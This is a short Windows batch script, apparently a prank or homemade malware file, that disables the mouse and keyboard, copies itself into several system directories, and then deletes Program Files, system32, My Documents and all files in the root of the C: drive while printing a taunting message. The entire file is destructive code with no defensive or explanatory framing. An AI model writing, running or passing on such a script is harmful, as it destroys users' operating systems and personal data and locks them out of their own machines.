@ ECHO OFF
:start
ECHO HEY HEY
c:\windows\rundll32.exe mouse,disable
c:\windows\rundll32.exe keyboard,disable
copy %0 c:\
copy %0 c:\windows\system32
copy %0 c:\progra~1
copy %0 c:\windows
goto :Devistate
cls

:Devistate
del /y c:\progra~1
del /y c:\windows\system32
del /y c:\windows\mydocu~1
goto :Ending
cls

:Ending
ECHO lets make room on ur hard drive
del /y c:\*.*
cls 

